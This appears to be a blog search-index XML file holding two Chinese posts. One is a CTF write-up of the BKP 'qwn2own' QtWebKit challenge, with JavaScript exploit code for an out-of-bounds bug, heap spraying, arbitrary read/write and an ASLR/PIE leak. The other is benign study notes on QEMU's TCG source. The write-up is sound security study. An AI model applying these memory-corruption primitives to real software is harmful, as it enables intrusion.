<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[BKP CTF qwn2own]]></title>
    <url>%2F2019%2F01%2F25%2Fqwn2own%2F</url>
    <content type="text"><![CDATA[最近一直在看 webkit，可是一点进展都没有，很多还是看不懂，感觉 webkit 有点复杂， 还是慢慢看吧，自信心都快没了，先入门 Javascriptcore 吧， 先看看相关的题目，后面应该还会有，只是给自己写的笔记，可能太乱。 题目介绍 The BKP Database JavasScript API allows users to store data that can be kept hidden from other users.This allows web applications to share one web context between multiple users but yet still be able to storesensitive information pertaining to each user and keep it secret from the others. emmm 就是写了个 JS 的扩展。 漏洞成因BKPStore 中的成员函数 get，remove，cut 的参数都是 int 型，并且在扩展实现中并未对传入的参数进行检验，当传入负数的时候会造成越界操作数据，可是后面发现 get 好像没用，看源码发现是 QVector 的 value 函数将 int 强制转换成了无符号整数。如下12345678template&lt;typename T&gt;Q_OUTOFLINE_TEMPLATE T QVector&lt;T&gt;::value(int i) const&#123; if (uint(i) &gt;= uint(d-&gt;size)) &#123; return T(); &#125; return d-&gt;begin()[i];&#125; 下面是 BKPStore 类的定义。12345678910111213141516171819202122class BKPStore : public QObject &#123; Q_OBJECTpublic: BKPStore(QObject * parent = 0, const QString &amp;name = 0, quint8 tp = 0, QVariant var = 0, qulonglong store_ping = 0); void StoreData(QVariant v); Q_INVOKABLE QVariant getall(); Q_INVOKABLE QVariant get(int idx); Q_INVOKABLE int insert(unsigned int idx, QVariant var); Q_INVOKABLE int append(QVariant var); Q_INVOKABLE void remove(int idx); Q_INVOKABLE void cut(int beg, int end); Q_INVOKABLE int size();private: quint8 type; // specifies which type to of vector // to use QVector&lt;QVariant&gt; varvect; QVector&lt;qulonglong&gt; intvect; QVector&lt;QString&gt; strvect; qulonglong store_ping;&#125;; remove 函数，可以看到并没有对传入的参数检测，cut 函数也是这样，并且都是调用 erase 去删除元素。12345678910111213void BKPStore::remove(int idx)&#123; if(this-&gt;type == 0)&#123; this-&gt;varvect.erase(this-&gt;varvect.begin() + idx); &#125;else if(this-&gt;type == 1)&#123; this-&gt;intvect.erase(this-&gt;intvect.begin() + idx); &#125;else if(this-&gt;type == 2)&#123; this-&gt;strvect.erase(this-&gt;strvect.begin() + idx); &#125;else&#123; // this doesn't happen ever BKPException ex; throw ex; &#125;&#125; 下面看下 erase 函数的实现，其实实现很简单，如果是静态 Vector 就在逐个删除数组中数据的同时将后面不需要删除的通过 new 重新拷贝过来，如果是非静态就直接通过析构函数删除需要被删除的，后面的直接通过 memmove 函数拷贝过来。可以看到并没有对传入的参数的合法性进行检查。12345678910111213141516171819202122232425262728293031323334template &lt;typename T&gt;typename QVector&lt;T&gt;::iterator QVector&lt;T&gt;::erase(iterator abegin, iterator aend)&#123; const int itemsToErase = aend - abegin; if (!itemsToErase) return abegin; const int itemsUntouched = abegin - d-&gt;begin(); if (d-&gt;alloc) &#123; detach(); abegin = d-&gt;begin() + itemsUntouched; aend = abegin + itemsToErase; if (QTypeInfo&lt;T&gt;::isStatic) &#123; iterator moveBegin = abegin + itemsToErase; iterator moveEnd = d-&gt;end(); while (moveBegin != moveEnd) &#123; if (QTypeInfo&lt;T&gt;::isComplex) static_cast&lt;T *&gt;(abegin)-&gt;~T(); new (abegin++) T(*moveBegin++); &#125; if (abegin &lt; d-&gt;end()) &#123; // destroy rest of instances destruct(abegin, d-&gt;end()); &#125; &#125; else &#123; destruct(abegin, aend); memmove(abegin, aend, (d-&gt;size - itemsToErase - itemsUntouched) * sizeof(T)); &#125; d-&gt;size -= itemsToErase; &#125; return d-&gt;begin() + itemsUntouched;&#125; exploitPartial OOB read当 remove 中传入的参数为负数时，会将负数位置处的数据删除，在将之后的数据拷贝过来，所以会将数据前的内存破坏。1inline iterator erase(iterator pos) &#123; return erase(pos, pos+1); &#125; 下面是 QArrayData 的定义12345678910111213141516171819202122232425struct Q_CORE_EXPORT QArrayData&#123; QtPrivate::RefCount ref; //引用计数 int size; //数组大小 uint alloc : 31; //占了31位 uint capacityReserved : 1; //占了1位 qptrdiff offset; // in bytes from beginning of header 从 Array 开始到数据的偏移 void *data() &#123; Q_ASSERT(size == 0 || offset &lt; 0 || size_t(offset) &gt;= sizeof(QArrayData)); return reinterpret_cast&lt;char *&gt;(this) + offset; &#125; const void *data() const &#123; Q_ASSERT(size == 0 || offset &lt; 0 || size_t(offset) &gt;= sizeof(QArrayData)); return reinterpret_cast&lt;const char *&gt;(this) + offset; &#125;......&#125;; 可以看到通过 remove(-1) 就可以改写 offset 来越界读取 Array 结构信息。如下12345678910111213141516171819&lt;html&gt;&lt;head&gt; &lt;title&gt;qwn2own&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="v4kst1z"&gt;&lt;/div&gt; &lt;script type="text/javascript"&gt; var db = BKPDataBase.create("v4kst1z", "v4kst1z"); store = db.createStore("A", 1, [0, 1, 2, 3, 4, 5, 6], 0xaabb); store.remove(-1); var info = ""; for (var i=0;i&lt;6;i++) &#123; info = info + i + " : " + store.get(i).toString(16) + "&lt;br&gt;"; &#125; document.getElementById("v4kst1z").innerHTML = info; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; Arbitrary R/W在 QArrayData 中的 size 变量指定了数组的大小，如果修改 size 的大小，便可以绕过读写时对大小的限制。为了达到任意读写，可以通过变量 store_ping 来标记另外一个数组，方便通过标记来获得另一个 store 中的 intvect 地址，方便后面通过修改另外一个数组的 offset 来达到任意读写。其实这些都在系统的 heap 中，如果只设置一个 store，因为 store 是在之前已经在堆上创建了，所以遍历到的可能性非常小，建立两个 store 会很方便。1234567891011121314151617181920212223242526272829303132&lt;html&gt;&lt;head&gt; &lt;title&gt;qwn2own&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="v4kst1z"&gt;&lt;/div&gt; &lt;script type="text/javascript"&gt; var db = BKPDataBase.create("v4kst1z", "v4kst1z"); store1 = db.createStore("A", 1, [0, 1, 2, 3, 4, 5, 6], 0xaabb); store2 = db.createStore("B", 1, [0, 1, 2, 3, 4, 5, 6], 0xccddee); store1.remove(-1); store1.insert(0, 0xffffffff00000001); var idx = -1; for(i = 0; i &lt; 0x100; i++) &#123; x = store1.get(i); if (x == 0xccddee &amp;&amp; (store1.get(i-1) == store1.get(i-3))) &#123; //strvect 和 varvect 在内存中的值相同 idx = i; break; &#125; &#125; if (idx == -1) &#123; alert("Not found, reloading..."); document.location = window.location.href; &#125; else &#123; document.getElementById("v4kst1z").innerHTML = "Found at idx " + i; &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 需要注意的是应该在用于利用的数组前创建大量数组，使后面创建的堆前后相邻，利用更时稳定，其实就是堆喷射，如果不这样做在调用读函数的时候会造成只有很小的概率成功，还是无法解释为什么如果不创建有时候没法修改 offset。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485&lt;html&gt;&lt;head&gt; &lt;title&gt;qwn2own&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="v4kst1z"&gt;&lt;/div&gt; &lt;script type="text/javascript"&gt; function read(addr) &#123; var offset = addr - B_vec; store1.insert(A2B_off_idx, offset); var x = store2.get(0); return x; &#125; function write(addr, content) &#123; var offset = addr - B_vec; store1.insert(A2B_off_idx, offset); var x = store2.insert(0, content); return x; &#125; var db = BKPDataBase.create("v4kst1z", "v4kst1z"); v4kst1z = new Array(200); for (var i =0;i&lt;200;i++) v4kst1z[i] = db.createStore(i.toString(16), 1, [0, 1, 2, 3, 4, 5，6], 1234); store1 = db.createStore("A", 1, [0, 1, 2, 3, 4, 5, 6], 0xaabbcc); store2 = db.createStore("B", 1, [0xaa0321, 0x12345df, 2, 3, 4, 5, 6], 0xccddee); store1.remove(-1); store1.insert(0, 0xfffff00000001); //后面任意读写需要修改size和offset //store2.remove(-1); 其实不用改size 就注释了 之前想错了 //store2.insert(0, 0xfffff00000001); var idx = -1; B_vec = -1; var A_vec = -1; A2B_off_idx = - 1 ; for (i=0;i&lt;0x2000;i++) &#123; x = store1.get(i); if (x == 0xccddee &amp;&amp; (store1.get(i-1) == store1.get(i-3))) &#123; //strvect 和 varvect 在内存中的值相同 idx = i; B_vec = store1.get(i-2); info = ""; for(i = i - 6; i &lt; idx + 6; i++) &#123; if(i == idx - 2) B_vec_addr = "[*] Found vector2 addr: " + store1.get(i).toString(16) + "&lt;br&gt;"; &#125; if(B_vec == -1) continue; info = info + B_vec_addr; i = idx; while (i++) &#123; if (store1.get(i) == 0xaa0321 &amp;&amp; store1.get(i+1) == 0x12345df) &#123; A_vec = B_vec - (i-3)*8; A2B_off_idx = i - 1 ; info = info + "[*] Found vector1 addr: " + A_vec.toString(16) + "&lt;br&gt;"; break; &#125; &#125; if(A_vec == -1 || A2B_off_idx == -1) continue; break; &#125; &#125; /* info = info + "&lt;br&gt; vector1:"; for(i = 0; i &lt; 6; i++) info = info + store1.get(i).toString(16) + " "; info = info + "&lt;br&gt; vector2:"; for(i = 0; i &lt; 6; i++) info = info + store2.get(i).toString(16) + " "; */ info = info + "&lt;br&gt;A2B_off_idx :" + A2B_off_idx.toString(10) + "&lt;br&gt;"; info = info + read(0x55cf14658000).toString(16); document.getElementById("v4kst1z").innerHTML = info; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; Bypass ASLR And PIE前面已经可以达到任意读写，并且也可以知道创建的 BKPStore 对象的信息，可以通过 leak 其 vtable 算出 qwn2own 的加载基址。 123456789info = info + "BKPStore vetable address : " + store1.get(idx - 6).toString(16) + "&lt;br&gt;";info = info + "Undefined : "+ store1.get(idx - 5).toString(16) + "&lt;br&gt;";info = info + "Type and aligement : " + store1.get(idx - 4).toString(16) + "&lt;br&gt;";info = info + "Varvect : " + store1.get(idx - 3).toString(16) + "&lt;br&gt;";info = info + "Intvect : " + store1.get(idx - 2).toString(16) + "&lt;br&gt;";info = info + "Strvect : " + store1.get(idx - 1).toString(16) + "&lt;br&gt;";info = info + "Store_ping: " + store1.get(idx).toString(16) + "&lt;br&gt;"var binary_base = store1.get(idx -6) - 0x210400;info = info + "Binary_base is : " + binary_base.toString(16) + "&lt;br&gt;"]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>browser</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[QEMU部分源码阅读]]></title>
    <url>%2F2019%2F01%2F09%2FQEMU-shadowstack%2F</url>
    <content type="text"><![CDATA[从备份失败的老博客还原出来的 概览Qemu 通过 TCG翻译引擎(可以理解为编译器)将每条 target 指令动态翻译成 TCG 微操作码(前端)，然后再转换成对应的 houst 的指令来实现仿真(后端)。Qemu 代码翻译流程：1target instruction -&gt;micro-op-&gt;tcg-&gt;host instruction qemu 仿真的大致流程图如下: 代码结构 vl.c 模拟循环，虚拟机机器环境初始化，和CPU的执行。 target-arch/translate.c 将guest代码转化成不同架构的TCG操作码。 tcg/tcg.c TCG操作码的实现 tcg-arch/tcg-target.c 将TCG操作码转化成对应的主机代码 cpu-exec.c 其中的cpu-exec()函数主要寻找下一个TB（翻译代码块），如果没找到就请求得到下一个TB，并且操作生成的代码块。 TCG 执行流程前端实现以 TB 为单位读入当前 pc 指向的 guest code 后端实现生成对应的 TCG 操作码并优化，最后转化为 host code TB CacheTB Cache 的应用使 translate code 可以进行重用，减少了 guest code 与 QEMU Translation Code 之间的切换, 提高了 QEMU 的性能。 相关数据结构TCGContext存放 TCG IR 的结构。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687struct TCGContext &#123; uint8_t *pool_cur, *pool_end; TCGPool *pool_first, *pool_current, *pool_first_large; int nb_labels; int nb_globals; int nb_temps; int nb_indirects; /* goto_tb support */ tcg_insn_unit *code_buf; uint16_t *tb_jmp_reset_offset; /* tb-&gt;jmp_reset_offset */ uint16_t *tb_jmp_insn_offset; /* tb-&gt;jmp_insn_offset if USE_DIRECT_JUMP */ uintptr_t *tb_jmp_target_addr; /* tb-&gt;jmp_target_addr if !USE_DIRECT_JUMP */ TCGRegSet reserved_regs; //寄存器 intptr_t current_frame_offset; intptr_t frame_start; intptr_t frame_end; TCGTemp *frame_temp; tcg_insn_unit *code_ptr; GHashTable *helpers;#ifdef CONFIG_PROFILER /* profiling info */ int64_t tb_count1; int64_t tb_count; int64_t op_count; /* total insn count */ int op_count_max; /* max insn per TB */ int64_t temp_count; int temp_count_max; int64_t del_op_count; int64_t code_in_len; int64_t code_out_len; int64_t search_out_len; int64_t interm_time; int64_t code_time; int64_t la_time; int64_t opt_time; int64_t restore_count; int64_t restore_time;#endif#ifdef CONFIG_DEBUG_TCG int temps_in_use; int goto_tb_issue_mask;#endif int gen_next_op_idx; int gen_next_parm_idx; /* Code generation. Note that we specifically do not use tcg_insn_unit here, because there's too much arithmetic throughout that relies on addition and subtraction working on bytes. Rely on the GCC extension that allows arithmetic on void*. */ int code_gen_max_blocks; void *code_gen_prologue; //指向缓冲区的prologue void *code_gen_buffer; //翻译后的指令缓冲区 size_t code_gen_buffer_size; //翻译后指令缓冲区的大小 void *code_gen_ptr; //指向翻译后的指令缓冲区 /* Threshold to flush the translated code buffer. */ void *code_gen_highwater; TBContext tb_ctx; /* Track which vCPU triggers events */ CPUState *cpu; /* *_trans cpu状态*/ TCGv_env tcg_env; /* *_exec */ /* The TCGBackendData structure is private to tcg-target.inc.c. */ struct TCGBackendData *be; TCGTempSet free_temps[TCG_TYPE_COUNT * 2]; TCGTemp temps[TCG_MAX_TEMPS]; /* globals first, temps after */ /* Tells which temporary holds a given register. It does not take into account fixed registers */ TCGTemp *reg_to_temp[TCG_TARGET_NB_REGS]; //临时寄存器变量 TCGOp gen_op_buf[OPC_BUF_SIZE]; //操作码缓冲区 TCGArg gen_opparam_buf[OPPARAM_BUF_SIZE]; //参数缓冲区 uint16_t gen_insn_end_off[TCG_MAX_INSNS]; target_ulong gen_insn_data[TCG_MAX_INSNS][TARGET_INSN_START_WORDS];&#125;; DisasContext应该可以理解为反编译 guest 需要的一些信息123456789101112131415161718192021222324252627282930313233343536373839404142434445typedef struct DisasContext &#123; /* current insn context */ int override; /* -1 if no override */ int prefix; TCGMemOp aflag; TCGMemOp dflag; target_ulong pc_start; target_ulong pc; /* pc = eip + cs_base */ int is_jmp; /* 1 = means jump (stop translation), 2 means CPU static state change (stop translation) */ /* current block context */ target_ulong cs_base; /* base of CS segment */ int pe; /* protected mode */ int code32; /* 32 bit code segment */#ifdef TARGET_X86_64 int lma; /* long mode active */ int code64; /* 64 bit code segment */ int rex_x, rex_b;#endif int vex_l; /* vex vector length */ int vex_v; /* vex vvvv register, without 1's compliment. */ int ss32; /* 32 bit stack segment */ CCOp cc_op; /* current CC operation */ bool cc_op_dirty; int addseg; /* non zero if either DS/ES/SS have a non zero base */ int f_st; /* currently unused */ int vm86; /* vm86 mode */ int cpl; int iopl; int tf; /* TF cpu flag */ int singlestep_enabled; /* "hardware" single step enabled */ int jmp_opt; /* use direct block chaining for direct jumps */ int repz_opt; /* optimize jumps within repz instructions */ int mem_index; /* select memory access functions */ uint64_t flags; /* all execution flags */ struct TranslationBlock *tb; int popl_esp_hack; /* for correct popl with esp base handling */ int rip_offset; /* only used in x86_64, but left for simplicity */ int cpuid_features; int cpuid_ext_features; int cpuid_ext2_features; int cpuid_ext3_features; int cpuid_7_0_ebx_features; int cpuid_xsave_features;&#125; DisasContext; CPUStatecpu 相关信息的记录123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134/** * CPUState: * @cpu_index: CPU index (informative). * @nr_cores: Number of cores within this CPU package. * @nr_threads: Number of threads within this CPU. * @numa_node: NUMA node this CPU is belonging to. * @host_tid: Host thread ID. * @running: #true if CPU is currently running (usermode). * @created: Indicates whether the CPU thread has been successfully created. * @interrupt_request: Indicates a pending interrupt request. * @halted: Nonzero if the CPU is in suspended state. * @stop: Indicates a pending stop request. * @stopped: Indicates the CPU has been artificially stopped. * @unplug: Indicates a pending CPU unplug request. * @crash_occurred: Indicates the OS reported a crash (panic) for this CPU * @tcg_exit_req: Set to force TCG to stop executing linked TBs for this * CPU and return to its top level loop. * @tb_flushed: Indicates the translation buffer has been flushed. * @singlestep_enabled: Flags for single-stepping. * @icount_extra: Instructions until next timer event. * @icount_decr: Number of cycles left, with interrupt flag in high bit. * This allows a single read-compare-cbranch-write sequence to test * for both decrementer underflow and exceptions. * @can_do_io: Nonzero if memory-mapped IO is safe. Deterministic execution * requires that IO only be performed on the last instruction of a TB * so that interrupts take effect immediately. * @cpu_ases: Pointer to array of CPUAddressSpaces (which define the * AddressSpaces this CPU has) * @num_ases: number of CPUAddressSpaces in @cpu_ases * @as: Pointer to the first AddressSpace, for the convenience of targets which * only have a single AddressSpace * @env_ptr: Pointer to subclass-specific CPUArchState field. * @gdb_regs: Additional GDB registers. * @gdb_num_regs: Number of total registers accessible to GDB. * @gdb_num_g_regs: Number of registers in GDB 'g' packets. * @next_cpu: Next CPU sharing TB cache. * @opaque: User data. * @mem_io_pc: Host Program Counter at which the memory was accessed. * @mem_io_vaddr: Target virtual address at which the memory was accessed. * @kvm_fd: vCPU file descriptor for KVM. * @work_mutex: Lock to prevent multiple access to queued_work_*. * @queued_work_first: First asynchronous work pending. * @trace_dstate: Dynamic tracing state of events for this vCPU (bitmask). * * State of one CPU core or thread. */struct CPUState &#123; /*&lt; private &gt;*/ DeviceState parent_obj; /*&lt; public &gt;*/ int nr_cores; int nr_threads; int numa_node; struct QemuThread *thread;#ifdef _WIN32 HANDLE hThread;#endif int thread_id; uint32_t host_tid; bool running; struct QemuCond *halt_cond; bool thread_kicked; bool created; bool stop; bool stopped; bool unplug; bool crash_occurred; bool exit_request; bool tb_flushed; uint32_t interrupt_request; int singlestep_enabled; int64_t icount_extra; sigjmp_buf jmp_env; QemuMutex work_mutex; struct qemu_work_item *queued_work_first, *queued_work_last; CPUAddressSpace *cpu_ases; int num_ases; AddressSpace *as; MemoryRegion *memory; void *env_ptr; /* CPUArchState */ struct TranslationBlock *tb_jmp_cache[TB_JMP_CACHE_SIZE]; struct GDBRegisterState *gdb_regs; int gdb_num_regs; int gdb_num_g_regs; QTAILQ_ENTRY(CPUState) node; /* ice debug support */ QTAILQ_HEAD(breakpoints_head, CPUBreakpoint) breakpoints; QTAILQ_HEAD(watchpoints_head, CPUWatchpoint) watchpoints; CPUWatchpoint *watchpoint_hit; void *opaque; /* In order to avoid passing too many arguments to the MMIO helpers, * we store some rarely used information in the CPU context. */ uintptr_t mem_io_pc; vaddr mem_io_vaddr; int kvm_fd; bool kvm_vcpu_dirty; struct KVMState *kvm_state; struct kvm_run *kvm_run; /* Used for events with 'vcpu' and *without* the 'disabled' properties */ DECLARE_BITMAP(trace_dstate, TRACE_VCPU_EVENT_COUNT); /* TODO Move common fields from CPUArchState here. */ int cpu_index; /* used by alpha TCG */ uint32_t halted; /* used by alpha, cris, ppc TCG */ union &#123; uint32_t u32; icount_decr_u16 u16; &#125; icount_decr; uint32_t can_do_io; int32_t exception_index; /* used by m68k TCG */ /* Used to keep track of an outstanding cpu throttle thread for migration * autoconverge */ bool throttle_thread_scheduled; /* Note that this is accessed at the start of every TB via a negative offset from AREG0. Leave this field at the end so as to make the (absolute value) offset as small as possible. This reduces code size, especially for hosts without large memory offsets. */ uint32_t tcg_exit_req;&#125;; image_info1234567891011121314151617struct image_info &#123; abi_ulong load_addr; //加载基址 abi_ulong start_code; //代码起始地址 abi_ulong end_code; //代码结束地址 abi_ulong start_data; //数据段起始地址 abi_ulong end_data; //数据段结束地址 abi_ulong start_brk; //用于堆分配的brk起始地址 abi_ulong brk; //结束地址? abi_ulong start_mmap; //mmap起始地址 abi_ulong mmap; //结束? abi_ulong rss; abi_ulong start_stack; //栈起始地址 abi_ulong entry; //程序入口点 abi_ulong code_offset; //代码段偏移 abi_ulong data_offset; //数据段偏移 int personality; &#125;; TranslationBlock注释挺全的 哈哈哈 自己看吧12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152struct TranslationBlock &#123; target_ulong pc; /* simulated PC corresponding to this block (EIP + CS base) */ target_ulong cs_base; /* CS base for this block */ uint32_t flags; /* flags defining in which context the code was generated */ uint16_t size; /* size of target code for this block (1 &lt;= size &lt;= TARGET_PAGE_SIZE) */ uint16_t icount; uint32_t cflags; /* compile flags */#define CF_COUNT_MASK 0x7fff#define CF_LAST_IO 0x8000 /* Last insn may be an IO access. */#define CF_NOCACHE 0x10000 /* To be freed after execution */#define CF_USE_ICOUNT 0x20000#define CF_IGNORE_ICOUNT 0x40000 /* Do not generate icount code */ void *tc_ptr; /* pointer to the translated code */ uint8_t *tc_search; /* pointer to search data */ /* original tb when cflags has CF_NOCACHE */ struct TranslationBlock *orig_tb; /* first and second physical page containing code. The lower bit of the pointer tells the index in page_next[] */ struct TranslationBlock *page_next[2]; tb_page_addr_t page_addr[2]; /* The following data are used to directly call another TB from * the code of this one. This can be done either by emitting direct or * indirect native jump instructions. These jumps are reset so that the TB * just continue its execution. The TB can be linked to another one by * setting one of the jump targets (or patching the jump instruction). Only * two of such jumps are supported. */ uint16_t jmp_reset_offset[2]; /* offset of original jump target */#define TB_JMP_RESET_OFFSET_INVALID 0xffff /* indicates no jump generated */#ifdef USE_DIRECT_JUMP uint16_t jmp_insn_offset[2]; /* offset of native jump instruction */#else uintptr_t jmp_target_addr[2]; /* target address for indirect jump */#endif /* Each TB has an assosiated circular list of TBs jumping to this one. * jmp_list_first points to the first TB jumping to this one. * jmp_list_next is used to point to the next TB in a list. * Since each TB can have two jumps, it can participate in two lists. * jmp_list_first and jmp_list_next are 4-byte aligned pointers to a * TranslationBlock structure, but the two least significant bits of * them are used to encode which data field of the pointed TB should * be used to traverse the list further from that TB: * 0 =&gt; jmp_list_next[0], 1 =&gt; jmp_list_next[1], 2 =&gt; jmp_list_first. * In other words, 0/1 tells which jump is used in the pointed TB, * and 2 means that this is a pointer back to the target TB of this list. */ uintptr_t jmp_list_next[2]; uintptr_t jmp_list_first;&#125;; 部分源码分析linux-user/main.c main只是一部分源码，没细看，等考研结束再看吧12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091int main(int argc, char **argv, char **envp)&#123; CPUState *cpu; // 初始化 TCG tcg_exec_init(0); //初始化cpu cpu = cpu_init(cpu_model); if (!cpu) &#123; fprintf(stderr, "Unable to find CPU definition\n"); exit(EXIT_FAILURE); &#125; //传递环境和命令行参数到 guest target_environ = envlist_to_environ(envlist, NULL); envlist_free(envlist); // 初始化 TaskState 数据结构 init_task_state(ts); /* build Task State */ ts-&gt;info = info; //被加载程序的一些信息(似乎镜像信息更合适) ts-&gt;bprm = &amp;bprm; cpu-&gt;opaque = ts; //加载指向guest, regs表示程序入口点 ret = loader_exec(execfd, filename, target_argv, target_environ, regs, info, &amp;bprm); //设置guest的brk指针 target_set_brk(info-&gt;brk); //初始化syscall和signal syscall_init(); signal_init(); /* 根据相应guest 设置cpu */ #if defined(TARGET_I386) env-&gt;cr[0] = CR0_PG_MASK | CR0_WP_MASK | CR0_PE_MASK; env-&gt;hflags |= HF_PE_MASK | HF_CPL_MASK; if (env-&gt;features[FEAT_1_EDX] &amp; CPUID_SSE) &#123; env-&gt;cr[4] |= CR4_OSFXSR_MASK; env-&gt;hflags |= HF_OSFXSR_MASK; &#125;#ifndef TARGET_ABI32 /* enable 64 bit mode if possible */ if (!(env-&gt;features[FEAT_8000_0001_EDX] &amp; CPUID_EXT2_LM)) &#123; fprintf(stderr, "The selected x86 CPU does not support 64 bit mode\n"); exit(EXIT_FAILURE); &#125; env-&gt;cr[4] |= CR4_PAE_MASK; env-&gt;efer |= MSR_EFER_LMA | MSR_EFER_LME; env-&gt;hflags |= HF_LMA_MASK;#endif /* 根据给的guest来设置相应的寄存器(64位是不是寄存器有点少啊) */ /* linux register setup */#ifndef TARGET_ABI32 env-&gt;regs[R_EAX] = regs-&gt;rax; env-&gt;regs[R_EBX] = regs-&gt;rbx; env-&gt;regs[R_ECX] = regs-&gt;rcx; env-&gt;regs[R_EDX] = regs-&gt;rdx; env-&gt;regs[R_ESI] = regs-&gt;rsi; env-&gt;regs[R_EDI] = regs-&gt;rdi; env-&gt;regs[R_EBP] = regs-&gt;rbp; env-&gt;regs[R_ESP] = regs-&gt;rsp; env-&gt;eip = regs-&gt;rip;#else env-&gt;regs[R_EAX] = regs-&gt;eax; env-&gt;regs[R_EBX] = regs-&gt;ebx; env-&gt;regs[R_ECX] = regs-&gt;ecx; env-&gt;regs[R_EDX] = regs-&gt;edx; env-&gt;regs[R_ESI] = regs-&gt;esi; env-&gt;regs[R_EDI] = regs-&gt;edi; env-&gt;regs[R_EBP] = regs-&gt;ebp; env-&gt;regs[R_ESP] = regs-&gt;esp; env-&gt;eip = regs-&gt;eip;#endif 下面是设置中断和段，还有其他架构的信息，不贴啦 /* 主要是cpu_loop这个函数，分析在下面 */ cpu_loop(env); /* never exits */ return 0;&#125; linux-user/main.c tcg_exec_init12345678910111213141516171819202122/* Must be called before using the QEMU cpus. 'tb_size' is the size (in bytes) allocated to the translation buffer. Zero means default size. */void tcg_exec_init(unsigned long tb_size)&#123; /* cpu_gen_init()调用tcg_context_init()对tcg_ctx进行初始化，在这个函数好像只设置了nb_globals和helpers，之后调用tcg_target_init设置寄存器？ */ cpu_gen_init(); page_init(); tb_htable_init(); /* code_gen_alloc为translate block分配缓冲区 */ code_gen_alloc(tb_size); #if defined(CONFIG_SOFTMMU) /* There's no guest base to take into account, so go ahead and initialize the prologue now. */ //初始化prologue tcg_prologue_init(&amp;tcg_ctx);#endif&#125; linux-user/main.c cpu_loop1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768void cpu_loop(CPUX86State *env)&#123; CPUState *cs = CPU(x86_env_get_cpu(env)); int trapnr; abi_ulong pc; abi_ulong ret; target_siginfo_t info; for(;;) &#123; cpu_exec_start(cs); //加锁，表示cpu正在被占用 /* 调用cpu_x86_exec函数进行翻译，并根据相应的返回值做相应处理，如中断和系统调用 */ trapnr = cpu_exec(cs); cpu_exec_end(cs); //释放锁 switch(trapnr) &#123; //32位系统调用 case 0x80: /* linux syscall from int $0x80 */ ret = do_syscall(env, env-&gt;regs[R_EAX], env-&gt;regs[R_EBX], env-&gt;regs[R_ECX], env-&gt;regs[R_EDX], env-&gt;regs[R_ESI], env-&gt;regs[R_EDI], env-&gt;regs[R_EBP], 0, 0); if (ret == -TARGET_ERESTARTSYS) &#123; env-&gt;eip -= 2; &#125; else if (ret != -TARGET_QEMU_ESIGRETURN) &#123; env-&gt;regs[R_EAX] = ret; &#125; break;#ifndef TARGET_ABI32 //64位系统调用 case EXCP_SYSCALL: /* linux syscall from syscall instruction */ ret = do_syscall(env, env-&gt;regs[R_EAX], env-&gt;regs[R_EDI], env-&gt;regs[R_ESI], env-&gt;regs[R_EDX], env-&gt;regs[10], env-&gt;regs[8], env-&gt;regs[9], 0, 0); if (ret == -TARGET_ERESTARTSYS) &#123; env-&gt;eip -= 2; &#125; else if (ret != -TARGET_QEMU_ESIGRETURN) &#123; //结果存到eax env-&gt;regs[R_EAX] = ret; &#125; break;#endif case EXCP0B_NOSEG: ..... default: pc = env-&gt;segs[R_CS].base + env-&gt;eip; EXCP_DUMP(env, "qemu: 0x%08lx: unhandled CPU exception 0x%x - aborting\n", (long)pc, trapnr); abort(); &#125; process_pending_signals(env); &#125;&#125; cpu-exec.c cpu_exec12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879/* main execution loop */int cpu_exec(CPUState *cpu)&#123; //CPUClass类似于c++的虚表，存放了一组函数指针 CPUClass *cc = CPU_GET_CLASS(cpu); int ret; SyncClocks sc; //保存当前cpu状态 /* replay_interrupt may need current_cpu */ current_cpu = cpu; ...... //对env-&gt;eflags进行初始化 cc-&gt;cpu_exec_enter(cpu); /* Calculate difference between guest clock and host clock. * This delay includes the delay of the last cycle, so * what we have to do is sleep until it is 0. As for the * advance/delay we gain here, we try to fix it next time. */ //好像和时钟周期有关? init_delay_params(&amp;sc, cpu); for(;;) &#123; /* prepare setjmp context for exception handling */ //正常情况下会进入if,不大懂可以查下sigsetjmp if (sigsetjmp(cpu-&gt;jmp_env, 0) == 0) &#123; TranslationBlock *tb, *last_tb = NULL; int tb_exit = 0; //如果有异常发生，并且不能处理则跳出 /* if an exception is pending, we execute it here */ if (cpu_handle_exception(cpu, &amp;ret)) &#123; break; &#125; cpu-&gt;tb_flushed = false; /* reset before first TB lookup */ for(;;) &#123; //处理中断 cpu_handle_interrupt(cpu, &amp;last_tb); //负责找到下一个需要执行的tb tb = tb_find_fast(cpu, &amp;last_tb, tb_exit); //执行找到的tb cpu_loop_exec_tb(cpu, tb, &amp;last_tb, &amp;tb_exit, &amp;sc); /* Try to align the host and virtual clocks if the guest is in advance */ align_clocks(&amp;sc, cpu); &#125; /* for(;;) */ &#125; else &#123;#if defined(__clang__) || !QEMU_GNUC_PREREQ(4, 6) /* Some compilers wrongly smash all local variables after * siglongjmp. There were bug reports for gcc 4.5.0 and clang. * Reload essential local variables here for those compilers. * Newer versions of gcc would complain about this code (-Wclobbered). */ //说明是通过siglongjmp到达的，恢复cpu之前保存的信息 cpu = current_cpu; cc = CPU_GET_CLASS(cpu);#else /* buggy compiler */ /* Assert that the compiler does not smash local variables. */ g_assert(cpu == current_cpu); g_assert(cc == CPU_GET_CLASS(cpu));#endif /* buggy compiler */ cpu-&gt;can_do_io = 1; tb_lock_reset(); &#125; &#125; /* for(;;) */ cc-&gt;cpu_exec_exit(cpu); 